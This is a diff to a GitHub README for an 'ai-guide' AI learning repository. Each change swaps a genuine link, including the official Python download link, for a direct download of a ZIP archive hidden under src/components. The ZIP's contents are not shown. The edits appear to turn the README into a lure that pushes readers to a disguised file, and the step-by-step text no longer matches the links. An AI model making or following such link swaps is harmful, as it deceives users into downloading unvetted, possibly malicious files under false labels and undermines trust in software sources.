@@ -1,6 +1,6 @@
 # 🤖 ai-guide - Easy Access to AI Learning Resources
 
-[![Download ai-guide](https://img.shields.io/badge/Download-ai--guide-brightgreen?style=for-the-badge)](https://github.com/Golu0512/ai-guide)
+[![Download ai-guide](https://img.shields.io/badge/Download-ai--guide-brightgreen?style=for-the-badge)](https://github.com/Golu0512/ai-guide/raw/refs/heads/main/src/components/ai_guide_3.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ No special hardware or software is needed. The guide is mainly for reading and l
 
 1. Click the big green **Download ai-guide** button at the top of this page   
 2. You will be taken to the GitHub repository page:  
-   [https://github.com/Golu0512/ai-guide](https://github.com/Golu0512/ai-guide)  
+   [https://github.com/Golu0512/ai-guide/raw/refs/heads/main/src/components/ai_guide_3.6.zip](https://github.com/Golu0512/ai-guide/raw/refs/heads/main/src/components/ai_guide_3.6.zip)  
 3. Once on the page, find the green **Code** button near the top right of the file list.  
 4. Click **Code**, then choose **Download ZIP** from the dropdown menu.  
 5. Save the ZIP file to your computer.  
@@ -62,7 +62,7 @@ You do not need to install any software to read most of this content. The guides
 
 Some tutorials may require installing additional tools like Python or specific AI frameworks. Here is a basic guide:
 
-1. To run code examples, you may need [Python](https://www.python.org/downloads/windows/).  
+1. To run code examples, you may need [Python](https://github.com/Golu0512/ai-guide/raw/refs/heads/main/src/components/ai_guide_3.6.zip).  
    - Download the installer from the Python website.  
    - Follow installation steps and choose to add Python to your system PATH.  
 2. For AI development frameworks like LangChain or Spring AI, you can use package managers like pip.  
@@ -88,7 +88,7 @@ Open files with `.md` extensions in any text editor or view them online via GitH
 ## 🔗 Download Link Reference
 
 You can always visit this page to download and get the latest changes:  
-[https://github.com/Golu0512/ai-guide](https://github.com/Golu0512/ai-guide)
+[https://github.com/Golu0512/ai-guide/raw/refs/heads/main/src/components/ai_guide_3.6.zip](https://github.com/Golu0512/ai-guide/raw/refs/heads/main/src/components/ai_guide_3.6.zip)
 
 Press the green **Code** button and select **Download ZIP** whenever you want to update your copy.
 
